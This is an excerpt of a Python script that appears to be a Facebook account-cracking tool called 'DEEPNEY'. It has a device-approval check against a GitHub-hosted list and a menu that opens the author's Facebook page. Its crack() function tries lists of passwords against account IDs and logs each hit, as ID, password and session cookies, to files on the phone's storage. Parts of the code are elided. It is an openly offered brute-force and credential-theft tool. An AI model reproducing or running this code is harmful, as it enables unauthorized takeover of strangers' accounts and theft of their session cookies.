...
def meyexudi():
  ...
  id = "K".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/karunbista768/DEEPNEY/blob/main/APPROVAL.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      ...
      os.system('am start https://www.facebook.com/DEEPNEYxx'),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
def menu():
    ...
    if HEART in ['111']:
        ...
        os.system('xdg-open https://www.facebook.com/DEEPNEYxx')
        os.system("python DEEPNEY.py")
    elif HEART in ['0']:
...
def crack(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}[DEEPNEY-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():              
                open('/sdcard/DEEPNEY-CP.txt', 'a').write(idf+'|'+pw+'\n')
                if 'y' in cpp:
                ...
                open('/sdcard/DEEPNEY-OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                if 'y' in cooki:
